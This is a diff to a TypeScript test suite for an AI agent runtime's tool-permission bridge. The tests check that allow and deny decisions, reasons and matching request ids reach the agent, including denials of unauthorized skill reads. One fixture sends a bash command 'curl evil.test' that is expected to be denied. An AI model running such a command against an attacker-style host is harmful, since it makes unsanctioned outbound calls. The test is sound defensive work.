@@ -15,6 +15,7 @@ import {
 } from "./pi-provider.js";
 import {
   createPiPermissionHooksReadyEvent,
+  formatPiPermissionUiDecisionValue,
   PI_PERMISSION_BRIDGE_UNAVAILABLE_MESSAGE,
   PI_PERMISSION_UI_TITLE,
 } from "./pi-tool-permissions.js";
@@ -257,7 +258,14 @@ describe("Pi runtime provider", () => {
         }),
       ).events,
     );
-    expect(deniedTransport.writes).toEqual([{ type: "extension_ui_response", id: "ui-deny", confirmed: false }]);
+    expect(deniedTransport.writes).toEqual([
+      {
+        type: "extension_ui_response",
+        id: "ui-deny",
+        confirmed: false,
+        value: formatPiPermissionUiDecisionValue({ allowed: false, reason: "Bash permission denied." }),
+      },
+    ]);
 
     const allowedTransport = new FakePiRpcTransport();
     allowedTransport.pushEvent({
@@ -279,7 +287,69 @@ describe("Pi runtime provider", () => {
         }),
       ).events,
     );
-    expect(allowedTransport.writes).toEqual([{ type: "extension_ui_response", id: "ui-allow", confirmed: true }]);
+    expect(allowedTransport.writes).toEqual([
+      {
+        type: "extension_ui_response",
+        id: "ui-allow",
+        confirmed: true,
+        value: formatPiPermissionUiDecisionValue({ allowed: true }),
+      },
+    ]);
+  });
+
+  it("answers queued parallel permission UI requests with matching ids and host reasons", async () => {
+    const transport = new FakePiRpcTransport();
+    let releaseDeny!: () => void;
+    const denyStarted = new Promise<void>((resolve) => {
+      releaseDeny = resolve;
+    });
+    transport.pushEvent({
+      type: "extension_ui_request",
+      id: "ui-parallel-deny",
+      method: "input",
+      title: PI_PERMISSION_UI_TITLE,
+      placeholder: JSON.stringify({ toolName: "bash", input: { command: "curl evil.test" } }),
+    });
+    transport.pushEvent({
+      type: "extension_ui_request",
+      id: "ui-parallel-allow",
+      method: "input",
+      title: PI_PERMISSION_UI_TITLE,
+      placeholder: JSON.stringify({ toolName: "read", input: { path: "README.md" } }),
+    });
+    transport.pushEvent({ type: "agent_end", messages: [assistantMessage("misto")] });
+
+    const eventsPromise = collectRuntimeEvents(
+      createPiRuntimeProvider({ transport }).startSession(
+        createStartRequest("paralelo", {
+          canUseTool: async (toolName) => {
+            if (toolName === "Bash") {
+              await new Promise<void>((resolve) => {
+                releaseDeny();
+                setTimeout(resolve, 20);
+              });
+              return { behavior: "deny", reason: "Bash permission denied." };
+            }
+            return { behavior: "allow" };
+          },
+        }),
+      ).events,
+    );
+
+    await denyStarted;
+    await eventsPromise;
+    expect(transport.writes).toEqual([
+      {
+        type: "extension_ui_response",
+        id: "ui-parallel-deny",
+        value: formatPiPermissionUiDecisionValue({ allowed: false, reason: "Bash permission denied." }),
+      },
+      {
+        type: "extension_ui_response",
+        id: "ui-parallel-allow",
+        value: formatPiPermissionUiDecisionValue({ allowed: true }),
+      },
+    ]);
   });
 
   it("denies unauthorized skill reads over the permission extension and allows a granted skill", async () => {
@@ -304,7 +374,17 @@ describe("Pi runtime provider", () => {
         }),
       ).events,
     );
-    expect(deniedTransport.writes).toEqual([{ type: "extension_ui_response", id: "ui-skill-deny", confirmed: false }]);
+    expect(deniedTransport.writes).toEqual([
+      {
+        type: "extension_ui_response",
+        id: "ui-skill-deny",
+        confirmed: false,
+        value: formatPiPermissionUiDecisionValue({
+          allowed: false,
+          reason: "SKILL_NOT_AUTHORIZED: Skill not authorized for agent: whatsapp-manager",
+        }),
+      },
+    ]);
 
     const allowedTransport = new FakePiRpcTransport();
     allowedTransport.pushEvent({
@@ -327,7 +407,14 @@ describe("Pi runtime provider", () => {
         }),
       ).events,
     );
-    expect(allowedTransport.writes).toEqual([{ type: "extension_ui_response", id: "ui-skill-allow", confirmed: true }]);
+    expect(allowedTransport.writes).toEqual([
+      {
+        type: "extension_ui_response",
+        id: "ui-skill-allow",
+        confirmed: true,
+        value: formatPiPermissionUiDecisionValue({ allowed: true }),
+      },
+    ]);
   });
 
   it("fails closed when the permission extension handshake never arrives", async () => {
@@ -573,7 +660,17 @@ describe("Pi runtime provider", () => {
 
     expect(transport.starts[0]?.systemPromptAppend).toContain("ravi-dev-app-creator");
     expect(transport.starts[0]?.systemPromptAppend).not.toContain("whatsapp-manager");
-    expect(transport.writes).toEqual([{ type: "extension_ui_response", id: "ui-hidden-skill", confirmed: false }]);
+    expect(transport.writes).toEqual([
+      {
+        type: "extension_ui_response",
+        id: "ui-hidden-skill",
+        confirmed: false,
+        value: formatPiPermissionUiDecisionValue({
+          allowed: false,
+          reason: "SKILL_NOT_AUTHORIZED: Skill not authorized for agent: whatsapp-manager",
+        }),
+      },
+    ]);
   });
 
   it("closes the Pi RPC transport idempotently", async () => {
